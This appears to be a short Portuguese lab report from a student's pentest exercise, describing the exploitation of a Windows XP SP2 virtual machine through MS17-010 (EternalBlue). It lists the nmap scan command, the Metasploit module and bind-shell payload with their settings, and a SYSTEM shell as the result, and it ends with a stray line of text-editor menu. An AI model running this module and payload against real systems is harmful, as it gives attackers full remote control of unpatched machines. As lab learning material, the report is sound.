# windows-xp-sp2-
> 🚨 AVISO: Este relatório é feito em ambiente controlado para fins educacionais e laboratoriais. Nenhuma ação foi realizada contra sistemas reais.
/windows-xp-ms17-010/
===============================
💣 RELATÓRIO DE EXPLORAÇÃO - MS17-010 (EternalBlue)
===============================

Autor: [Seu Nome Hacker]

Data: 2025-04-04

---------------------------
🔍 Fase 1 - Reconhecimento
---------------------------

Máquina Alvo: Windows XP SP2
IP da Máquina Alvo: 192.168.0.112
IP da Máquina Atacante (Kali): 192.168.0.103

Comando Nmap usado:
nmap -sV -p- --script vuln -O 192.168.0.112

Serviços Descobertos:
- Porta 445 - Serviço SMB - Possivelmente vulnerável a MS17-010

Vulnerabilidade encontrada:
- MS17-010 (EternalBlue)
- Falha crítica no SMBv1 que permite execução remota de código como SYSTEM.

---------------------------
🎯 Fase 2 - Exploração
---------------------------

Exploit utilizado:
exploit/windows/smb/ms17_010_psexec

Payload utilizado:
windows/shell/bind_tcp

Configurações:
- set RHOST: 192.168.0.112
- set LHOST:
- set LPORT: 4444

Resultado da exploração:
✅ Shell acessada com sucesso via bind_tcp
🧑‍💻 Acesso como: SYSTEM
📡 Comunicação ativa: 192.168.0.112:4444


Shell Banner:
Microsoft Windows XP [Version 5.1.2600]

---------------------------
🛠️ Comandos executados:
---------------------------

- `dir` para listar arquivos
- Shell totalmente funcional dentro de `C:\WINDOWS\system32`

===============================
📜 Comentários Finais:
===============================

Essa exploração marca o meu segundo acesso real a um sistema vulnerável usando técnicas de pentest ofensivo.
A falha MS17-010 é uma das mais notórias da história da segurança da informação.
Executar esse ataque com sucesso reforça minha confiança e mostra que o estudo, prática e curiosidade são as verdadeiras armas do hacker ético.



^G Ajuda         ^O Gravar        ^F Onde está?    ^K Recortar      ^T Executar      ^C Local     
